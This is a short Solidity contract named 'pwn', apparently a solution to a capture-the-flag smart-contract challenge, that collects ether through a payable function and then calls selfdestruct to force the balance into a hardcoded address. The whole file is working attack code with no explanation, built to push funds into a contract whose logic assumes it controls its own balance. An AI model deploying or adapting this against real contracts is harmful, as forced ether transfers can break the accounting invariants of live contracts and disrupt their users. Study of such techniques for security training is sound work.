// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

contract pwn {

    function exploit() public  {
        address payable addr = 0x26A2Aebc97B021483f543092A8BE181E6D74760d;
        selfdestruct(addr);
    }

    function balance() public view returns(uint) {
        return address(this).balance;
    }

    uint public balanceReceived;
    
    function Receive() public payable {
        balanceReceived += msg.value;
    }

}
